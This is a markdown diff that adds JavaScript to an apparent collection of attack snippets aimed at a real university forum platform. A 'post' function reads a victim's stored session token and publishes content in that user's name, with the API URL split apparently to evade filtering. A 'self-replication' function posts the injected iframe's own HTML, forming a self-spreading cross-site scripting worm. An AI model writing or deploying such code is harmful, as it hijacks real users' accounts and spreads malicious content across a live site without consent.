@@ -227,6 +227,58 @@ function comment(id, msg) {
 }
 ```
 
+### Post
+Given the msg and post it.
+```javascript
+function post(msg) {
+  let token = localStorage.getItem('token');
+      
+  let data = {
+    'post_msg': msg,
+    'post_topic': '%E8%B7%B3%E8%9A%A4',
+    'user_is_real_name': false,
+    'post_public': 2,
+    'post_is_uni': false,
+    'post_image': '%5B%5D',
+    'token': token,
+    'language': 'zh-CN'
+  };
+  let string = '';
+  for (let key in data) {
+    string += key + '=' + data[key] + '&';
+  }
+  string = string.slice(0, -1);
+
+  let response = createCORS('POST', 'htt' + 'ps://api.uni.hkupootal.com/v4/post/single/post.php');
+
+  if (!response) {
+    throw new Error('CORS not supported');
+  }
+
+  response.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  response.send(string);
+  let result = response.responseText;
+  return result;
+}
+```
+
+### Self-replication
+⚠️DANGEROUS！！！
+```javascript
+function selfReplicationWithPost() {
+  // get self iframe_srting
+  let self = pdoc.getElementById('iseeyou');
+  // to string
+  let self_string = self.outerHTML;
+
+  // encodeURI
+  self_string = encodeURIComponent(self_string);
+
+  // change false to true to make post public
+  post(self_string, false);
+}
+```
+
 ### Redirect to another page
 
 ```javascript
